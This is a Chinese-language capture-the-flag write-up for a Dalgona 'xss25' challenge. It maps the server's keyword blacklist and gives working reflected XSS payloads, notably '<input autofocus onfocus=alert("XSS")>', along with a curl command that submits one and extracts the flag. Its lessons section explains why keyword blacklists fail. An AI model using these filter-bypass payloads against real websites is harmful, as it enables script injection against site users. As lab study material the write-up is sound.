## 题解

### 入口与指纹

`Werkzeug/1.0.1` + **Python 2.7.18**（老栈），端口 5000。首页是
`Dalgona Challenges`，只有一个入口 `xss25`（`<title>Dalgona - Star</title>`）。

`GET /xss25` 是一个 `POST` 表单，字段名 `solution`，占位符 `Enter solution...`。
响应头带 `X-XSS-Protection: 0`——明确告诉你这是要打 XSS 的题。

### 关键观察

**1. 存在性判据来自服务端的无头浏览器。**

提交任意内容后，服务端渲染三种结果之一：

| 响应文本 | 含义 |
| --- | --- |
| `Sorry you can't use: '<token>'` | 黑名单命中 |
| `Oops! You did an alert with TypeError: ... instead of "XSS"` | 页面里触发了 `alert`，但参数不是 `"XSS"` |
| `Congratulations!<p> Here is the flag: flag{...}` | 成功 |

所以这题**不是**让浏览器弹窗给你看，而是服务端跑 headless 浏览器，
钩住 `alert` 并检查参数等于 `XSS`。判据是响应里的这三段文本。

**2. 反射点是"标签之后的文本节点"。**

输入被拼在 `<input>` 之后：

```html
<input type=text name=solution placeholder="Enter solution..." > <input autofocus onfocus=alert("XSS")>>
```

注意结尾多出一个 `>`，是模板自带的；输入本身被原样插入，**未做 HTML 转义**。

**3. 黑名单是按字面量匹配的，且只覆盖了一部分事件。**

| payload | 结果 |
| --- | --- |
| `<script>alert(1)</script>` | `Sorry you can't use: 'script'` |
| `<img src=x onerror=alert(1)>` | `Sorry you can't use: 'onerror'` |
| `<svg onload=alert("XSS")>` | `Sorry you can't use: 'onload'` |
| `<body onload=...>` / `<iframe onload=...>` / `<img onload=...>` | 同上，`onload` 被拦 |
| `<details open ontoggle=alert("XSS")>` | 过黑名单，但触发的是 TypeError（非 `XSS`） |
| `<input autofocus onfocus=alert("XSS")>` | **通过** |
| `<select autofocus onfocus=alert("XSS")>` | **通过** |

黑名单至少包含 `script`、`onerror`、`onload`，但**没有 `onfocus`**。

### 利用链

`autofocus` 让元素在页面加载后自动获得焦点，`onfocus` 随即触发 `alert("XSS")`：

```bash
T=$(head -1 .target)
curl -sS -X POST \
  --data-urlencode 'solution=<input autofocus onfocus=alert("XSS")>' \
  "http://$T/xss25" \
| grep -o 'flag{[^}]*}'
```

响应：

```html
<div class="solution-text">
  <img src="static/img/cookies/success_star.png" alt="Correct">
  <br>Congratulations!<p> Here is the flag: flag{2639f2d7-9db5-493b-ad26-9a360de3bc4d}
</div>
```

`<select autofocus onfocus=...>` 同样有效——说明通过点是「`autofocus` + `onfocus`」这个组合，
而不是某个特定标签。

### flag 位置

成功响应的 `solution-text` 区块内，`Here is the flag:` 之后。

## 复盘

- **无头浏览器的错误信息是免费的调试信息。** `You did an alert with ... instead of "XSS"`
  同时告诉你三件事：`alert` 被调用了、参数被捕获了、期望值是字符串 `XSS`。
  没有这句提示，很容易误以为 payload 没执行。
- **只拦 `script`/`onerror`/`onload` 是典型的不完整黑名单。** 事件处理器有那么多种，
  黑名单思路本身就不成立；实际可用的是 `onfocus` + `autofocus`（无需用户交互）。
- **`autofocus` 是关键。** 无头浏览器不会去点、去滚、去悬停，所以 `onclick`、`onmouseover`
  这类需要交互的处理器无效；`onfocus` 配 `autofocus` 或 `ontoggle` 配 `open` 才在加载时自动触发。
- **`ontoggle` 那个 TypeError 值得注意。** 它证明「能自动触发」但参数不对也算失败，
  说明评分只看 `alert` 的参数值，不看机制。
- **反射点带尾随 `>`。** 模板是 `> {{ input }}>`，所以注入的标签后面会多一个 `>`，
  这个多余的字符会变成一个文本节点，不影响利用，但会让"闭合标签"类的 payload 变复杂。
